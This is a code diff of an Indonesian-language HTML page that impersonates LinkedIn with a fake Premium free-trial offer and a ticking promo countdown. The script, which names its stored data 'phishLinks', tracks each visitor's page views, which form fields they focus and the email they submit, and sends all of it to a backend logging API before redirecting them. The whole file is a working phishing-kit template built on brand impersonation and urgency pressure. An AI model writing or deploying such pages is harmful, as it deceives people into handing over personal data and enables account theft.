@@ -1,5 +1,3 @@
-<!-- LINKEDIN PREMIUM TEMPLATE -->
-<!-- File: social_media_linkedin.html -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -8,61 +6,17 @@
     <title>LinkedIn Premium - Free Trial</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, system-ui, sans-serif;
-            background: linear-gradient(135deg, #0077b5 0%, #00a0dc 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            max-width: 550px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-        }
-        .header {
-            background: #0077b5;
-            padding: 35px 30px;
-            color: white;
-            text-align: center;
-        }
+        body { font-family: -apple-system, system-ui, sans-serif; background: linear-gradient(135deg, #0077b5 0%, #00a0dc 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 550px; margin: 0 auto; background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+        .header { background: #0077b5; padding: 35px 30px; color: white; text-align: center; }
         .header .logo { font-size: 3rem; margin-bottom: 15px; }
         .header h1 { font-size: 2rem; margin-bottom: 10px; }
-        .premium-badge {
-            background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
-            color: #8b4513;
-            padding: 12px 25px;
-            border-radius: 50px;
-            display: inline-block;
-            font-weight: bold;
-            margin-top: 15px;
-        }
+        .premium-badge { background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%); color: #8b4513; padding: 12px 25px; border-radius: 50px; display: inline-block; font-weight: bold; margin-top: 15px; }
         .content { padding: 30px; }
-        .promo-box {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 25px;
-            border-radius: 12px;
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .benefits {
-            background: #f3f6f8;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-        }
+        .promo-box { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 12px; text-align: center; margin-bottom: 25px; }
+        .benefits { background: #f3f6f8; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
         .benefits h3 { color: #0077b5; margin-bottom: 15px; }
-        .benefit-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 10px 0;
-            border-bottom: 1px solid #ddd;
-        }
-        .benefit-item:last-child { border-bottom: none; }
+        .benefit-item { display: flex; align-items: center; gap: 10px; padding: 10px 0; border-bottom: 1px solid #ddd; }
         .timer { background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 10px; text-align: center; margin-bottom: 20px; }
         .timer .time { font-size: 2rem; color: #d32f2f; font-weight: bold; font-family: monospace; }
         .form-section { background: #f3f6f8; padding: 25px; border-radius: 12px; }
@@ -92,9 +46,7 @@
                 <h3>✨ Benefit Premium:</h3>
                 <div class="benefit-item"><span style="color: #0077b5;">✓</span> InMail credits unlimited</div>
                 <div class="benefit-item"><span style="color: #0077b5;">✓</span> Who's viewed your profile</div>
-                <div class="benefit-item"><span style="color: #0077b5;">✓</span> Applicant insights</div>
                 <div class="benefit-item"><span style="color: #0077b5;">✓</span> LinkedIn Learning courses</div>
-                <div class="benefit-item"><span style="color: #0077b5;">✓</span> Priority customer support</div>
             </div>
             <div class="timer">
                 <strong style="color: #856404; display: block; margin-bottom: 10px;">⏰ PROMO BERAKHIR:</strong>
@@ -133,64 +85,33 @@
         </div>
     </div>
     <script>
+        const API_URL = 'http://localhost:5000/api';
         const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id') || 'demo';
-        function trackView() {
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            if (link) {
-                link.views = (link.views || 0) + 1;
-                if (!link.visitors) link.visitors = [];
-                const visitorId = Date.now();
-                link.visitors.push({ id: visitorId, timestamp: Date.now(), duration: 0, inputData: false });
-                links[links.findIndex(l => l.id === linkId)] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-                sessionStorage.setItem('visitorId', visitorId);
-                sessionStorage.setItem('linkId', linkId);
-                sessionStorage.setItem('startTime', Date.now());
-            }
-        }
+        const linkId = urlParams.get('id');
+        
+        async function trackView() { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'LinkedIn Premium page opened' }) }); } catch (e) {} }
+        async function trackClick(f) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${f}\` }) }); } catch (e) {} }
+        async function trackSubmit(d) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {} }
+        
         let time = 63930;
         setInterval(() => {
             const h = Math.floor(time / 3600), m = Math.floor((time % 3600) / 60), s = time % 60;
-            document.getElementById('timer').textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            document.getElementById('timer').textContent = \`\${h.toString().padStart(2,'0')}:\${m.toString().padStart(2,'0')}:\${s.toString().padStart(2,'0')}\`;
             time--; if (time < 0) time = 63930;
         }, 1000);
-        document.getElementById('activateForm').addEventListener('submit', function(e) {
+        
+        let c = new Set();
+        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() { const n = this.id; if (!c.has(n)) { c.add(n); trackClick(n); } }));
+        
+        document.getElementById('activateForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            if (link) {
-                link.inputData = (link.inputData || 0) + 1;
-                const visitorId = sessionStorage.getItem('visitorId');
-                const visitor = link.visitors.find(v => v.id == visitorId);
-                if (visitor) {
-                    visitor.inputData = true;
-                    visitor.duration = Math.floor((Date.now() - parseInt(sessionStorage.getItem('startTime'))) / 1000);
-                }
-                links[links.findIndex(l => l.id === linkId)] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-            }
-            const btn = e.target.querySelector('.btn-claim');
-            btn.textContent = '⏳ Processing...';
-            btn.disabled = true;
+            await trackSubmit({ email: document.getElementById('email').value });
+            const b = e.target.querySelector('.btn-claim');
+            b.textContent = '⏳ Processing...'; b.disabled = true;
             setTimeout(() => window.location.href = 'index.html', 2000);
         });
-        trackView();
-        window.addEventListener('beforeunload', () => {
-            const vid = sessionStorage.getItem('visitorId'), lid = sessionStorage.getItem('linkId'), st = parseInt(sessionStorage.getItem('startTime'));
-            if (vid && lid && st) {
-                const dur = Math.floor((Date.now() - st) / 1000);
-                let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-                const link = links.find(l => l.id === lid);
-                if (link) {
-                    const v = link.visitors.find(vv => vv.id == vid);
-                    if (v && !v.inputData) v.duration = dur;
-                    links[links.findIndex(l => l.id === lid)] = link;
-                    localStorage.setItem('phishLinks', JSON.stringify(links));
-                }
-            }
-        });
+        
+        window.addEventListener('DOMContentLoaded', trackView);
     </script>
 </body>
 </html>
